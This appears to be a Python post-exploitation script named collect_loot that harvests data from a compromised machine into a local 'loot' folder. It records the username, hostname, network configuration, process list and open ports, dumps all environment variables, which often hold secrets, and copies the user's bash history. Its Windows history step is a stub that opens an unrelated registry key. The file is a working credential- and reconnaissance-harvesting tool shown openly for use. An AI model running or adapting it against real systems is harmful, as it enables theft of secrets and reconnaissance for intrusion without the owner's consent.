import os
import platform
import socket
import subprocess
import datetime
import shutil

def run_cmd(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL)
        return result.strip()
    except Exception:
        return ""

def collect_loot():
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = os.path.join(os.path.expanduser("~"), f"loot_{timestamp}")
    os.makedirs(output_dir, exist_ok=True)

    # Collect user info
    with open(os.path.join(output_dir, "user_info.txt"), "w", encoding="utf-8") as f:
        f.write(f"Username: {os.getlogin()}\n")
        f.write(f"Platform: {platform.platform()}\n")
        f.write(f"Hostname: {socket.gethostname()}\n")
        f.write(f"IP addresses:\n")
        f.write(run_cmd("ipconfig /all" if os.name == "nt" else "ip a") + "\n")
        f.write(f"Environment Variables:\n")
        for k, v in os.environ.items():
            f.write(f"{k}={v}\n")

    # Collect system info
    with open(os.path.join(output_dir, "system_info.txt"), "w", encoding="utf-8") as f:
        f.write(run_cmd("systeminfo" if os.name == "nt" else "uname -a") + "\n")
        f.write(run_cmd("tasklist" if os.name == "nt" else "ps aux") + "\n")
        f.write(run_cmd("netstat -ano" if os.name == "nt" else "netstat -tulnp") + "\n")

    # Copy bash history (Linux) or PowerShell history (Windows)
    if os.name != "nt":
        bash_hist = os.path.expanduser("~/.bash_history")
        if os.path.exists(bash_hist):
            shutil.copy2(bash_hist, output_dir)
    else:
        # Windows PowerShell history path
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist")
        except Exception:
            pass  # skipping advanced history for now

    print(f"Loot collected in folder: {output_dir}")

if __name__ == "__main__":
    collect_loot()
input("Press Enter to exit...")
